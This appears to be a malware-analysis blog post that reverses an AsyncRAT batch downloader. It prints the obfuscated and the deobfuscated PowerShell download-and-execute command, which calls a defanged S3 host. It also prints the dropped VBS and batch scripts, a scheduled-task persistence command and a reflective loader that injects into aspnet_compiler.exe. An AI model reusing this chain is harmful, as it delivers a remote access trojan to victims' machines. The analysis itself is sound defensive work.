---
tags: RAT-Reversing
---
## Reversing ASync RART Downloaders / Configs

Going through a few examples / techniques that can be used to find the configuration information for ASync RAT payloads.

## Example 1 - Batch Downloader

Out initial file is taken from:
https://www.virustotal.com/gui/file/16b4a6fec76b452f77a6832871ff2e906d673e557a0e6c2673fc952181d1319b

This is a fairly simple batch script which contains a lot of garbage Japanese strings, but within these strings there is a variable being defined, and an interesting command line.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1c5a6dc9-20af-43d5-9a39-95245285aa2a)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7f365d8e-b5b4-46ea-a4bb-f99579f74a2b)

```powershell
C^M^D.%rHX%X%rHX% /C P^OW%rHX%RSH%rHX%LL.%rHX%X%rHX% -N^O^P -WI^N^D HIDD%rHX%N -%rHX%X%rHX%C B^YPA^SS -NO^NI [BYT%rHX%[]];$vjpi='I%rHX%X(N%rHX%W-OBJ%rHX%CT N%rHX%T.W';$Jzzm='%rHX%BCLI%rHX%NT).DOWNLO';[BYT%rHX%[]];$AYeD='TUUL(''hxxps[://]buckotx.s3.amazonaws[.]com/x.png'')'.R%rHX%PLAC%rHX%('TUUL','ADSTRING');[BYT%rHX%[]];I%rHX%X($vjpi+$Jzzm+$AYeD)
```

Similar to our method in the Analysing Obfuscated PowerShell Scripts blog, if we set the variable and add an "echo" to before the ommand line, we are able to deobfuscate the string.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/89a35c56-d8f2-488c-82e2-19d7491efdca)

Which gives us this output:

```
CMD.EXE /C POWERSHELL.EXE -NOP -WIND HIDDEN -EXEC BYPASS -NONI [BYTE[]];$vjpi='IEX(NEW-OBJECT NET.W';$Jzzm='EBCLIENT).DOWNLO';[BYTE[]];$AYeD='TUUL(''hxxps[://]buckotx.s3.amazonaws[.]com/x.png'')'.REPLACE('TUUL','ADSTRING');[BYTE[]];IEX($vjpi+$Jzzm+$AYeD)
```

Essentially, the command is downloading and executing a payload from 'hxxps[://]buckotx.s3.amazonaws[.]com/x.png'

This payload creates the directory 'C:\ProgramData\Not\' and downloads further payloads and outputs them in this directory.

These payloads are ran in chained execution, until the final payload, which executes 2 PEs to deploy the ASync RAT.

xx.vbs:
```
WScript.Sleep(2000)
set A = CreateObject("WScript.Shell")
A.run "C:\ProgramData\Not\xx.bat",0
```

xx.bat:
```
schtasks.exe /create /tn App /sc minute  /mo 3 /tr "C:\ProgramData\Not\Bin.vbs"
```

Bin.vbs:
```
With CreateObject("WScript.Shell")
.Run "C:\ProgramData\Not\Bin.bat", 0, True
End With
```

Bin.bat:
```
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Not\Bin.ps1
```

Bin.ps1:
```
Function Binary2String([String] $Yatak) {
    $byteList = [System.Collections.Generic.List[Byte]]::new()
    for ($i = 0; $i -lt $Yatak.Length; $i +=8) {
        $byteList.Add([Convert]::ToByte($Yatak.Substring($i, 8), 2))
    }
    return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())
}
Function HexaToByte([String] $IN) {
    $data = $IN.Replace('@','0')
    $bytes = New-Object -TypeName byte[] -ArgumentList ($data.Length / 2)
    for ($i = 0; $i -lt $data.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($data.Substring($i, 2), 16)
    }
    return [byte[]]$bytes
}

start-sleep 1

$serv = '4D5A9@@@@3@@@@@@@4@@@@@@FFFF@@@@B8@@@@@@@@@@@@@@4@@@@@@@@@@@@@@@@@@@@@@...REDACTED'

$Data = '4D5A9@@@@3@@@@@@@4@@@@@@FFFF@@@@B8@@@@@@@@@@@@@@4@@@@@@...REDACTED'

 try 
{
	[byte[]]$WULC4 = HexaToByte($serv)
    [byte[]]$YIV4Z = HexaToByte($DATA)
	$OKM4 = (Binary2String("#1###1#1#1111####11##1#1#11###11#111#1#1#111#1###11##1#1".Replace('#','0')))
	$inv = (Binary2String("0#00#00#0##0###00###0##00##0####0##0#0##0##00#0#".Replace('#','1')))
	$Path  = 'C:' + '\Wi##nd##ows\Mi#' + '#cro##soft.NET\Frame#' + '#work\v4.0.30319\asp##net_com##pi##ler.' + 'e' + 'x' + 'e'
	$NN0 = [System.Reflection.Assembly]
	$NN1 = $NN0::Load(($YIV4Z))
	$NN2 = $NN1.GetType('G'+ 'IT.l' + 'ocal');
	$NN3 = $NN2.'GetMethod'($OKM4);
	$NN3.$inv($null,[object[]] ($Path.Replace("##",""),$WULC4));
  
   } catch { }
```
